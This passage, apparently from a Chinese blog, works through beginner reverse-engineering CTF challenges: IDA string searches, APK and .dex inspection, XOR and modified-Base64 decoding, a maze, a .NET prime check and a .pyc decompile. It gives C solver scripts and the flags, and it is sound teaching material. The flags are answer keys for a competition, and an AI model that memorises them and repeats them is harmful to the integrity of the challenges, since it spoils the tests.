Great! Here is your flag:，点进去，找到位置ctrl+x，到真正的flag处。得到</p><pre><code>SYC&#123;S4y_He11o_th3_RE_World!!!&#125;</code></pre><h3 id="2-我真不会写驱动！"><a href="#2-我真不会写驱动！" class="headerlink" title="2.我真不会写驱动！"></a>2.我真不会写驱动！</h3><p>不知道是不是题有问题，直接拖到IDA里面，shift+f12查看字符串，就有了flag</p><pre><code>SYC&#123;First_Win64_DRIVER&#125;</code></pre><h3 id="3-WhatsApk"><a href="#3-WhatsApk" class="headerlink" title="3.WhatsApk"></a>3.WhatsApk</h3><p>APK实际上就是一个备份文件，解压后，得到一些文件，网上搜一搜apk文件结构，了解了解。</p><p>取巧做法将全部文件后缀名改为txt，然后一个一个文件的搜索SYC，得到flag</p><pre><code>SYC&#123;WelC0me_to_android!&#125;</code></pre><p>实际上估计应该是要用jed软件，然后在jeb里面搜索，下一道题就会用到。</p><h3 id="4-HelloAndroid"><a href="#4-HelloAndroid" class="headerlink" title="4.HelloAndroid"></a>4.HelloAndroid</h3><p>首先安装jed，挺难找软件的，安好了还要安个Java。</p><p>安装好了，把class.dex文件直接拖到jeb里面，然后点字符串，搜索SYC,得到</p><pre><code>SYC&#123;Android_in_Java_is_easy!&#125;</code></pre><h3 id="5-re00"><a href="#5-re00" class="headerlink" title="5.re00"></a>5.re00</h3><p>考点：异或<br>要先到IDA里面看，shift+12,点进去可以的地方，ctrl+x，然后f5，看伪代码，关键点为</p><pre><code>if ( (char)(buf[i] ^ 0x44) != byte_4060[i] )//buf[i]就是输入的flag，然后和0x44进行了一个异或运算，得到了byte_4060[i]。</code></pre><p>点开byte_4060[i]，其值为</p><pre><code>byte_4060       db 17h, 1Dh, 7, 3Fh, 37h, 2Dh, 29h, 34h, 28h, 21h, 1Bh.data:0000000000004060                                         ; DATA XREF: main+93↑o.data:0000000000004060                 db 37h, 2Dh, 29h, 34h, 28h, 21h, 1Bh, 3Ch, 2Bh, 3 dup(36h).data:0000000000004060                 db 1Bh, 36h, 2Dh, 23h, 2Ch, 30h, 2 dup(7Bh), 39h</code></pre><p>需要知道dup代表的是什么，然后异或回去就行<br>脚本如下</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */int main(int argc, char *argv[]) &#123;    signed int i; // [rsp+8h] [rbp-48h]    int buf[32]; // [rsp+10h] [rbp-40h]    int byte_4060[32]=&#123;0x17,0x1D,0x07,0x3F,0x37,0x2D,0x29,0x34,0x28,0x21,0x1B,0x37,0x2D,0x29,0x34,0x28,0x21,0x1B,0x3C,0x2B,0x36,0x36,0x36,0x1B,0x36,0x2D,0x23,0x2C,0x30,0x7B,0x7B,0x39&#125;;//从IDA中得到byte_4060的16进制数串 后面有一串字符 但是不像flag，发现if里面用异或运算编码了，写脚本来解码。  for ( i = 0; i &lt;= 31; ++i )  &#123;     buf[i]=byte_4060[i] ^0x44;//解码  &#125;  for(i=0;i&lt;=31;i++)  &#123;      printf(&quot;%x &quot;,buf[i]);//可改为printf(&quot;%c&quot;,buf[i]);直接得到字符串  &#125;  printf(&quot;\n&quot;);  //得到解码后的16进制数串，将其转换为字符串，得到flag。  puts(&quot;yes! you get it!&quot;);  return 0LL;&#125;</code></pre><p>得到flag</p><pre><code>SYC&#123;simple_simple_xorrr_right??&#125;</code></pre><h3 id="6-maze"><a href="#6-maze" class="headerlink" title="6.maze"></a>6.maze</h3><p>首先还是用IDA打开，shift+12搜索字符串，发现tttttttttttttttql!!!十分可疑，点进去，Ctrl+x进入主函数，F5生成伪代码，如下</p><pre><code>int sub_401A10()&#123;  int v0; // ecx  int v1; // eax  int v2; // esi  char *v3; // ecx  unsigned int v4; // kr00_4  int v5; // eax  char v6; // cl  char v8[108]; // [esp+8h] [ebp-70h]  char v9[108]; // [esp+9h] [ebp-6Fh]  sub_402400(dword_431974);  sub_401CB0(v0, &quot;give me your way:&quot;);  sub_406FD0(v8, 0, 100);  v1 = sub_409A97(0);  sub_409E54(v1);  sub_401100(&quot;%64s&quot;, (unsigned int)v8);  v2 = 0;  v3 = v9;  v4 = strlen(v8);  if ( v4 )  &#123;v5 = dword_431960;while ( 1 )&#123;  v6 = v8[v2];  if ( v6 == 97 )break;  switch ( v6 )  &#123;case 119:  v5 -= 31;  goto LABEL_11;case 115:  v5 += 31;  goto LABEL_11;case 100:  ++v5;  goto LABEL_11;  &#125;LABEL_12:  LOBYTE(v3) = byte_42E820[v5];  if ( (_BYTE)v3 == 111 )  &#123;sub_401CB0(v3, &quot;Ur not on the way!!&quot;);sub_4099B9(0);LABEL_17:sub_401CB0(v3, &quot;ttttttttttttttttttttql!!&quot;);sub_4099B9(0);JUMPOUT(*(_DWORD *)algn_401B14);  &#125;  if ( (_BYTE)v3 == 69 )goto LABEL_17;  if ( ++v2 &gt;= v4 )return 0;&#125;--v5;LABEL_11:dword_431960 = v5;goto LABEL_12;  &#125;  return 0;&#125;</code></pre><p>百度搜索：ctf 迷宫问题，<a href="https://wiki.x10sec.org/reverse/maze/maze/" title="maze ctf">https://wiki.x10sec.org/reverse/maze/maze/</a>发现与这道题有相识之处，从而知道</p><pre><code>.rdata:0042E821&#39;__________ooooo_____o________o_ooooooooo__ooo__ooo_oooooooooo_ooo&#39;.rdata:0042E821 db &#39;ooooooo__o__oooo_oooooooooo________oooo___ooooo_ooooooooooooooooo&#39;.rdata:0042E821 db &#39;_oooooooooooo_ooooooooooooooooo_ooooo_oooooo_ooooooooooooooooo_oo&#39;.rdata:0042E821 db &#39;ooo_oooooo_oooooooooos_______ooooo_oooooo__________Eooooooooooooo&#39;.rdata:0042E821 db &#39;oooooooooooooooooo&#39;,0</code></pre><p>代表的是迷宫，用shift+e调出迷宫，发现迷宫数据，但是需要知道迷宫的长宽，我的做法是先调为16进制，通过拉扯边框的大小使里面数据成为一个矩形，发现变成9*31时恰好是个矩形！！！！，并且按照5F走迷宫的确有一条路。</p><p>再看主函数，发现</p><pre><code>v5 -= 31;v5 += 31;</code></pre><p>中的31相当之可疑，发现这原来是1维数组变2维数组，每31个就换行。16进制的图十分不好看，换一下<br>    #include&lt;stdio.h&gt;</p><pre><code>int main(void)&#123;    int i,j;    int a[9][31]=&#123;   95,  95,  95,  95,  95,  95,  95,  95,  95,  95,   111, 111, 111, 111, 111,  95,  95,  95,  95,  95,   111,  95,  95,  95,  95,  95,  95,  95,  95, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,    95,  95, 111, 111, 111,  95,  95, 111, 111, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95,  95, 111,  95,  95, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95,  95,  95,  95,  95,  95,  95,  95,   111, 111, 111, 111,  95,  95,  95, 111, 111, 111,   111, 111,  95, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111,  95, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111,  95, 111, 111,   111, 111, 111, 111,  95, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95, 111, 111, 111, 111, 111,  95, 111,   111, 111, 111, 111, 111,  95, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 115,  95,  95,  95,    95,  95,  95,  95, 111, 111, 111, 111, 111,  95,   111, 111, 111, 111, 111, 111,  95,  95,  95,  95,    95,  95,  95,  95,  95,  95,  69, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111,0 &#125;;  for(i=0;i&lt;9;i++)  &#123;      for(j=0;j&lt;31;j++)      &#123;          printf(&quot;%c&quot;,a[i][j]);    &#125;    printf(&quot;\n&quot;);  &#125;&#125; </code></pre><p>发现运行后不对</p><pre><code>__________ooooo_____o________o_ooooooooo__ooo__ooo_oooooooooo_oooooooooo__o__oooo_oooooooooo________oooo___ooooo_ooooooooooooooooo_oooooooooooo_ooooooooooooooooo_ooooo_oooooo_ooooooooooooooooo_ooooo_oooooo_oooooooooos_______ooooo_oooooo__________Eooooooooooooooooooooooooooooooo--------------------------------Process exited after 0.1652 seconds with return value 0请按任意键继续. . .</code></pre><p>迷宫怎么会缺了一个角。观察地图，最右边那一列如果移到左边不就感觉更好了，感觉应该是少了一个，添上去，c代码如下<br>    #include&lt;stdio.h&gt;</p><pre><code>int main(void)&#123;    int i,j;    int a[9][31]=&#123;   95,95,  95,  95,  95,  95,  95,  95,  95,  95,  95,   111, 111, 111, 111, 111,  95,  95,  95,  95,  95,   111,  95,  95,  95,  95,  95,  95,  95,  95, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,    95,  95, 111, 111, 111,  95,  95, 111, 111, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95,  95, 111,  95,  95, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95,  95,  95,  95,  95,  95,  95,  95,   111, 111, 111, 111,  95,  95,  95, 111, 111, 111,   111, 111,  95, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111,  95, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111,  95, 111, 111,   111, 111, 111, 111,  95, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95, 111, 111, 111, 111, 111,  95, 111,   111, 111, 111, 111, 111,  95, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 115,  95,  95,  95,    95,  95,  95,  95, 111, 111, 111, 111, 111,  95,   111, 111, 111, 111, 111, 111,  95,  95,  95,  95,    95,  95,  95,  95,  95,  95,  69, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111,&#125;;  for(i=0;i&lt;9;i++)  &#123;      for(j=0;j&lt;31;j++)      &#123;          printf(&quot;%c&quot;,a[i][j]);    &#125;    printf(&quot;\n&quot;);  &#125;&#125;//（注意要把数组中最后的0去掉）</code></pre><p>运行</p><pre><code>___________ooooo_____o________o_ooooooooo__ooo__ooo_oooooooooo_oooooooooo__o__oooo_oooooooooo________oooo___ooooo_ooooooooooooooooo_oooooooooooo_ooooooooooooooooo_ooooo_oooooo_ooooooooooooooooo_ooooo_oooooo_oooooooooos_______ooooo_oooooo__________Eooooooooooooooooooooooooooooooo--------------------------------Process exited after 0.07231 seconds with return value 0请按任意键继续. . .</code></pre><p>迷宫准备就绪。感觉出题人相当有意思，SYC；迷宫中的s应该代表的是start起点，E应该代表的是end终点。实际上看主函数也可看出终点</p><pre><code>LABEL_17:sub_401CB0(v3, &quot;ttttttttttttttttttttql!!&quot;);sub_4099B9(0);JUMPOUT(*(_DWORD *)algn_401B14);  &#125;  if ( (_BYTE)v3 == 69 )//如果v3=69，也就是E，跳到LABEL_17，说ttttttttttttttql！！！说明是正确的终点goto LABEL_17;</code></pre><p>现在需要做的就是走迷宫，迷宫肯定需要方向，是什么呢？再看主函数</p><pre><code>  v6 = v8[v2];  if ( v6 == 97 )//‘a’=97,--v5不就代表向左移动吗       --v5;//做了一点改动  switch ( v6 )  &#123;case 119://&#39;199&#39;=w，v5 -= 31不就是向上移动吗  v5 -= 31;  goto LABEL_11;case 115://‘115’=s，  v5 += 31不就是向下移动吗  v5 += 31;  goto LABEL_11;case 100://&#39;100&#39;=d,++5不就表示向右移动吗  ++v5;  goto LABEL_11;  &#125;</code></pre><p>感觉出题人，非常人性化，知道打游戏这几个键最常用QAQ。tqltqltql<br>开始走迷宫，得到flag(注意s和E不算)</p><p>得到flag：SYC{dddddddwwwwaaaaaaawwwddddddddddsdsdsddwdwdwddddsssssssdddddddddd}</p><h3 id="7-Hello-NET"><a href="#7-Hello-NET" class="headerlink" title="7.Hello .NET"></a>7.Hello .NET</h3><h4 id="一-反编译"><a href="#一-反编译" class="headerlink" title="一.反编译"></a>一.反编译</h4><p>文件下载下来是个可执行文件，需要反编译来看代码</p><p>首先下载反编译软件<br><a href="https://www.cnblogs.com/heibai-ma/p/12893654.html">https://www.cnblogs.com/heibai-ma/p/12893654.html</a></p><p>然后看如何反编译<br><a href="https://blog.csdn.net/ajwqb06628/article/details/102071245?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.compare&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.compare">https://blog.csdn.net/ajwqb06628/article/details/102071245?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.compare&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.compare</a></p><h4 id="二-分析代码"><a href="#二-分析代码" class="headerlink" title="二.分析代码"></a>二.分析代码</h4><p>反编译后得到的关键代码如下(需要自己去在反编译出来的文件里面找找)<br>    public class MainWindow : Window, IComponentConnector<br>    {<br>        internal TextBox InputBox;<br>        internal Button Check_Btn;<br>        internal TextBlock Status;<br>        private bool _contentLoaded;</p><pre><code>    public MainWindow()    &#123;        this.InitializeComponent();    &#125;    private void Check(object sender, RoutedEventArgs e)    &#123;        int num;        string text = this.InputBox.Text;   //输入一个flag，也是要求的目标        List&lt;int&gt; list = new List&lt;int&gt;();   //  https://zhidao.baidu.com/question/539039145.html        int[] numArray = new int[] &#123;             0x12, 14, 40, -14, -2, 30, 10, 0x2a, 0x23, 0x30, 0x2b, 0x31, 0x34, 0x48, 0x39, 0x44,            0x56, 0x91, 0x73, 0x80, 0x73, 0x56        &#125;;//长度为22        for (num = 0x63; list.Count &lt; text.Length; num += 2)        //0x63=99，   list.Count &lt; text.Length，意思是要list[num]这个数组的长度和list.text[]数组长度一样，实际上list[num]，text[num]，numArray[num]的长度都要一样，都为22.                 &#123;            bool flag2 = true;  //布尔变量            for (int i = 3; i &lt; num; i += 2)//这个循环就是为了求list[num]这个数组。和求素数基本差不多，有点不一样。            &#123;                if ((num % i) == 0)                &#123;                    flag2 = false;                    break;                &#125;            &#125;            if (flag2)            &#123;                list.Add(num);   // 得到list[num]这个下面要用的数组            &#125;        &#125;        bool flag = true;        for (num = 0; (num &lt; text.Length) &amp;&amp; (num &lt; numArray.Length); num++)        &#123;            if ((list[num] - text[num]) != numArray[num])  //  不等于的话，flag=false，就说明错了，说明等于的时候才是对的，意思是flag  text[num]=list[num]-numArray[num]            &#123;                flag = false;                break;            &#125;        &#125;        if ((text.Length == numArray.Length) &amp; flag)        &#123;            this.Status.Foreground = new SolidColorBrush(Colors.Green);            this.Status.Text = &quot;Flag is corrent&quot;;        &#125;        else        &#123;            this.Status.Foreground = new SolidColorBrush(Colors.Red);            this.Status.Text = &quot;Flag is incorrent&quot;;        &#125;    &#125;</code></pre><h4 id="三-写脚本"><a href="#三-写脚本" class="headerlink" title="三.写脚本"></a>三.写脚本</h4><p>脚本1</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int num;    char a[22]=&#123;0,&#125;;    int b[22]=&#123;18,14,40,-14,-2,30,10,42,35,48,43,49,52,72,57,68,86,145,115,128,115,86&#125;;    int c[22]=&#123;0,&#125;;    int len=100;    int flag2,i,j,n;     for(num=99,j=0;j&lt;60;num+=2,j++)    &#123;        n=0;        flag2=1;        for(i=3;i&lt;num;i+=2)        &#123;            if(num%i==0)            &#123;            flag2=0;            break;            &#125;            &#125;        if(flag2)        &#123;    c[n]=num;            printf(&quot;%d &quot;,c[n]);            n++;//得到c[]=&#123;101 103 107 109 113 127 131 137 139 149 151 157 163 167 173 179 181 191 193 197 199 211&#125;         &#125;//                b[]=&#123;18,14,40,-14,-2,30,10,42,35,48,43,49,52,72,57,68,86,145,115,128,115,86&#125;;    &#125;//    printf(&quot;\n&quot;);//    for(num=0;num&lt;22;num++)//    &#123;//        a[num]=c[num]-b[num];//        printf(&quot;%d &quot;,a[num]);//     &#125; //    //    &#125;</code></pre><p>脚本2</p><pre><code>#include&lt;stdio.h&gt;int main(void) &#123;    int a[22]=&#123;18,14,40,-14,-2,30,10,42,35,48,43,49,52,72,57,68,86,145,115,128,115,86&#125;;    int b[22]=&#123;101 ,103 ,107 ,109 ,113 ,127 ,131 ,137 ,139 ,149 ,151 ,157 ,163, 167 ,173 ,179 ,181 ,191 ,193 ,197 ,199 ,211&#125;;    int c[22]=&#123;0&#125;;    int i;    for(i=0;i&lt;22;i++)    &#123;        c[i]=b[i]-a[i];        printf(&quot;%c&quot;,c[i]);    &#125;&#125;</code></pre><p>得到flag<br>SYC{say_hello_to_.NET}</p><h3 id="8-刘壮的BaseXX"><a href="#8-刘壮的BaseXX" class="headerlink" title="8.刘壮的BaseXX"></a>8.刘壮的BaseXX</h3><h4 id="一-调试与代码分析"><a href="#一-调试与代码分析" class="headerlink" title="一.调试与代码分析"></a>一.调试与代码分析</h4><p>拿到exe文件，直接拖到IDA里面看伪代码，如下</p><pre><code>__int64 sub_1400014E0()&#123;  void *v1; // [rsp+28h] [rbp-B0h]//定义了一个数组  signed __int64 v2; // [rsp+30h] [rbp-A8h] //一个整型变量，应该是数组的长度  char v3[128]; // [rsp+40h] [rbp-98h]//又定义了一个数组  memset(v3, 0, sizeof(v3));  v1 = (void *)sub_140004EF4(256i64);  sub_140003498(aYouMightKnowBa);  while ( 1 )  &#123;    while ( 1 )    &#123;      sub_140001060((__int64)aInputYourFlag);//叫你输入flag      sub_140004ED8((__int64)v3, 128i64);//将flag赋给v3      v2 = -1i64;      do        ++v2;      while ( v3[v2] );//应该算v2的值，计算数组长度      sub_140001420((__int64)v3, v2);//第一步加密，异或和位运算，需要进一步看子函数。      memset(v1, 0, 0x100ui64);      sub_1400010E0((__int64)v3, (__int64)v1, v2);//改了base64编码索引表的加密方式，将v3再次加密，需要进一步看子函数。      if ( v1 )        break;      sub_140003498(aUnExpectedErro);    &#125;    if ( (unsigned int)sub_140001490((unsigned __int8 *)v1) )//将最后的v1和设定的字符串进行比较，如果对了就会跳出循环，说明正确，设定的字符串为 maj7TmztjquUN8Xm-hKplvaYfEAxrUnIc51qxlKOwCKN4XsdzBmjOd_-  ，长度为56，也可通过这个来计算v3长度为42。      break;    sub_140001060((__int64)aWrongFlagTryAg);  &#125;  sub_140001060((__int64)aCorrectYouAreR);  sub_140004EE0(v1);  sub_140004C24(aPause);  return 0i64;&#125;</code></pre><p>重要子函数1</p><pre><code>__int64 __fastcall sub_140001420(__int64 a1, unsigned int a2)//a1是v3，也就是加密后的，v2是数组长度。&#123;  __int64 result; // rax  signed int i; // [rsp+4h] [rbp-14h]  for ( i = 0; ; ++i )  &#123;    result = a2;    if ( i &gt;= (signed int)a2 )      break;    *(_BYTE *)(a1 + i) = i ^ ((*(_BYTE *)(a1 + i) &gt;&gt; 4) | 16 * *(_BYTE *)(a1 + i));//加密方式，注意其中的16*，意思是&lt;&lt;4,如果是8*的话，是&lt;&lt;3。  &#125;  return result;&#125;</code></pre><p>重要子函数2，整体的加密过程不做过多分析</p><pre><code>__int64 __fastcall sub_1400010E0(__int64 a1, __int64 a2, int a3)//a1是v3，是加密前的，a2是v2是加密后的，a3是原来的长度。&#123;  int v3; // ST00_4  int v4; // ST00_4  int v5; // ST00_4  int v7; // [rsp+0h] [rbp-18h]  int v8; // [rsp+4h] [rbp-14h]  int v9; // [rsp+8h] [rbp-10h]  v9 = a3 % 3;  v8 = 0;  v7 = 0;  while ( v8 &lt; a3 - v9 )  &#123;    *(_BYTE *)(a2 + v7) = aZyxwvutsrqponm[(signed int)*(unsigned __int8 *)(a1 + v8) &gt;&gt; 2];    v3 = v7 + 1;    *(_BYTE *)(a2 + v3++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 1) &amp; 0xF0) &gt;&gt; 4) | 16 * (*(_BYTE *)(a1 + v8) &amp; 3)];    *(_BYTE *)(a2 + v3++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 2) &amp; 0xC0) &gt;&gt; 6) | 4                                                                                    * (*(_BYTE *)(a1 + v8 + 1) &amp; 0xF)];  //4*是&lt;&lt;2。    *(_BYTE *)(a2 + v3) = aZyxwvutsrqponm[*(_BYTE *)(a1 + v8 + 2) &amp; 0x3F];    v7 = v3 + 1;    v8 += 3;  &#125;  if ( v9 == 1 )  &#123;    *(_BYTE *)(a2 + v7) = aZyxwvutsrqponm[(signed int)*(unsigned __int8 *)(a1 + v8) &gt;&gt; 2];    v4 = v7 + 1;    *(_BYTE *)(a2 + v4++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 1) &amp; 0xF0) &gt;&gt; 4) | 16 * (*(_BYTE *)(a1 + v8) &amp; 3)];    *(_BYTE *)(a2 + v4++) = 61;    *(_BYTE *)(a2 + v4) = 61;//两个61代表加两个==    v7 = v4 + 1;  &#125;  else if ( v9 == 2 )  &#123;    *(_BYTE *)(a2 + v7) = aZyxwvutsrqponm[(signed int)*(unsigned __int8 *)(a1 + v8) &gt;&gt; 2];    v5 = v7 + 1;    *(_BYTE *)(a2 + v5++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 1) &amp; 0xF0) &gt;&gt; 4) | 16 * (*(_BYTE *)(a1 + v8) &amp; 3)];    *(_BYTE *)(a2 + v5++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 2) &amp; 0xC0) &gt;&gt; 6) | 4                                                                                    * (*(_BYTE *)(a1 + v8 + 1) &amp; 0xF)];    *(_BYTE *)(a2 + v5) = 61;    v7 = v5 + 1;  &#125;  return (unsigned int)v7;&#125;</code></pre><p>其中最关键的还是那个 zyxwvutsrqponmlkjihgfedcbaABCDEFGHIJKLMNOPQRSTUVWXYZ9876543210-_ ，这是将编码的索引表改了。</p><pre><code>// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123;  _BYTE *v4; // [rsp+20h] [rbp-30h]  int v5; // [rsp+2Ch] [rbp-24h]  int v6; // [rsp+44h] [rbp-Ch]  int v7; // [rsp+48h] [rbp-8h]  int i; // [rsp+48h] [rbp-8h]  int v9; // [rsp+4Ch] [rbp-4h]  _main(*(_QWORD *)&amp;argc, argv, envp);  v5 = strlen(&quot;Happy birthday! yangtianci!&quot;);  if ( v5 % 3 )    v9 = 4 * (v5 / 3 + 1);  else    v9 = 4 * (v5 / 3);  v4 = malloc(v9 + 1i64);  v4[v9] = 0;  v7 = 0;  v6 = 0;  while ( v7 &lt; v5 )  &#123;    v4[v6] = aAbcdefghijklmn[(char)(aHappyBirthdayY[v7] &gt;&gt; 2)];    v4[v6 + 1] = aAbcdefghijklmn[16 * (aHappyBirthdayY[v7] &amp; 3) | (char)(aHappyBirthdayY[v7 + 1] &gt;&gt; 4)];    v4[v6 + 2] = aAbcdefghijklmn[4 * (aHappyBirthdayY[v7 + 1] &amp; 0xF) | (char)(aHappyBirthdayY[v7 + 2] &gt;&gt; 6)];    v4[v6 + 3] = aAbcdefghijklmn[aHappyBirthdayY[v7 + 2] &amp; 0x3F];    v7 += 3;    v6 += 4;  &#125;  if ( v5 % 3 == 1 )  &#123;    v4[v9 - 2] = 61;    v4[v9 - 1] = 61;  &#125;  else if ( v5 % 3 == 2 )  &#123;    v4[v9 - 1] = 61;  &#125;  for ( i = 0; i &lt; v9; ++i )    putchar((unsigned __int8)v4[i]);  return 0;&#125;</code></pre><p>可以将自己写的base编码放到IDA里面看，与题中对比，大同小异。</p><p>总结：看伪代码需要明确知道定义的各个变量的含义，以及放到子函数总哪个变量对应哪个变量，慢慢分析。</p><h4 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h4><p>写脚本需要掌握base64解码</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */int main(int argc, char *argv[]) &#123;        char *str1=&quot;maj7TmztjquUN8Xm-hKplvaYfEAxrUnIc51qxlKOwCKN4XsdzBmjOd_-&quot;;        unsigned char *str2;        int table[]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,0,             0,0,0,0,0,0,0,0,0,0,62,0,             0,61,60,59,58,57,56,55,             54,53,52,0,0,0,0,0,0,0,26,             27,28,29,30,31,32,33,34,35,36,37,38,             39,40,41,42,43,44,45,46,47,             48,49,50,51,0,0,0,0,63,0,25,             24,23,22,21,20,19,18,17,16,             15,14,13,12,11,10,9,8,7,             6,5,4,3,2,1,0               &#125;; //换了之后的索引表        int len1;        int len2;        int i,j;         len1=strlen(str1);        if(strstr(str1,&quot;==&quot;))        &#123;            len2=(len1/4)*3-2;        &#125;            else if(strstr(str1,&quot;=&quot;))        &#123;            len2=(len1/4)*3-1;        &#125;        else        &#123;            len2=(len1/4)*3;        &#125;        str2=malloc(sizeof(unsigned char)*len2+1);          str2[len2]=&#39;\0&#39;;        for(i=0,j=0;i&lt;len1-2;i+=4,j+=3)        &#123;            str2[j]=((table[str1[i]])&lt;&lt;2)|((table[str1[i+1]])&gt;&gt;4);            str2[j+1]=(table[str1[i+1]]&lt;&lt;4)|((table[str1[i+2]])&gt;&gt;2);            str2[j+2]=((table[str1[i+2]])&lt;&lt;6)|(table[str1[i+3]]);        &#125;    //    printf(&quot;%d&quot;,len2);         for(i=0;i&lt;len2;i++)        &#123;              printf(&quot;%d &quot;,str2[i]);           &#125;           printf(&quot;\n&quot;) ;        //第一步base解码           for(i=0;i&lt;len2;i++)           &#123;               str2[i]=((str2[i]^i)&lt;&lt;4)|((str2[i]^i)&gt;&gt;4); //第二步解密。               printf(&quot;%c&quot;,str2[i]);           &#125;    return 0;&#125;</code></pre><h4 id="三-得到flag"><a href="#三-得到flag" class="headerlink" title="三.得到flag"></a>三.得到flag</h4><p>SYC{M0dified_B@se64_is_Sti11_S1mpl3_Right}</p><h3 id="9-un-snake"><a href="#9-un-snake" class="headerlink" title="9.un_snake"></a>9.un_snake</h3><h4 id="一-反汇编"><a href="#一-反汇编" class="headerlink" title="一.反汇编"></a>一.反汇编</h4><p>首先下载下来发现是pyc的文件，网上一搜需要反编译，用网上在线编译，发现少了很多代码。然后用uncompyle6进行反编译</p><pre><code>uncompyle6 -o  C:\Users\hp\Downloads\un_snake.cpython-38.py C:\Users\hp\Downloads\un_snake.cpython-38.pyc</code></pre><p>在cmd中输入这串代码如果这样有</p><pre><code># Successfully decompiled file</code></pre><p>代表成功了</p><h3 id="二-分析代码-1"><a href="#二-分析代码-1" class="headerlink" title="二.分析代码"></a>二.分析代码</h3><p>将反编译出来的.py文件后缀名改为.c。为了好看一点，打开如下</p><pre><code># uncompyle6 version 3.7.4# Python bytecode 3.8 (3413)# Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]# Embedded file name: ./un_snake.py# Compiled at: 2020-08-05 16:20:40# Size of source mod 2**32: 1238 bytesimport thisfrom base64 import *def pre(data):    th1s = &#39;TBESCFSRSAEUITANAIIN&#39;.encode()    if (data_len := len(data)) &gt; (th1s_len := len(th1s)):        th1s = th1s * (data_len // th1s_len) + th1s[:data_len - th1s_len]     #这个if主要是将date的长度弄的和th1s一样    return bytes(map(lambda x, y: x ^ y, data, th1s))  #再算stuff.encode()def enc(plain):    plain = list(plain)    plain = plain[::-1]  #将字符串反着排序     for i in range(len(plain)):        c = plain[i]        plain[i] = (c &lt;&lt; 3 | c &gt;&gt; 5) &amp; 255   #先执行for循环，再执行else里面的    else:        for i in range(len(plain) - 1):            plain[i] ^= plain[(i + 1)]#异或运算，将plain加密了        else:            return bytes(plain)  #再算stuff_ready def check(a):    return b64encode(a) == b&#39;mEiQCAjJoXJy2NiZQGGQyRm6IgHYQZAICKgowHHo4Dg=&#39;  //base64解码，先算enc(stuff_ready) if __name__ == &#39;__main__&#39;:    print()    while True:        stuff = input(&#39;Now input you flag:&#39;)   //输入的flag，最终目标         stuff_ready = pre(stuff.encode())        result = check(enc(stuff_ready))#其实就是3个逆向的问题，一步一步往上推，每一个函数都代表一个加密，其中第2个加密最复杂        if result:            print(&#39;You get it! Python is so charming right?&#39;)            break        else:            print(&#39;Failed, try again!&#39;)    print(&#39;[馃悕] Commit you flag, see you next time!&#39;)</code></pre><p>看到这个Python代码，开始什么感觉有些地方看不懂，网上查了一部分，Python自学了一部分(也就学到了列表)，然后进行分析个大概思路，简略分析在上面的代码后面,下面是查找的一些内容。</p><p>1.plain = plain[::-1]</p><pre><code>b = a[i:j]   表示复制a[i]到a[j-1]，以生成新的list对象a = [0,1,2,3,4,5,6,7,8,9]b = a[1:3]   # [1,2]当i缺省时，默认为0，即 a[:3]相当于 a[0:3]当j缺省时，默认为len(alist), 即a[1:]相当于a[1:10]当i,j都缺省时，a[:]就相当于完整复制一份ab = a[i:j:s]表示：i,j与上面的一样，但s表示步进，缺省为1.所以a[i:j:1]相当于a[i:j]当s&lt;0时，i缺省时，默认为-1. j缺省时，默认为-len(a)-1所以a[::-1]相当于 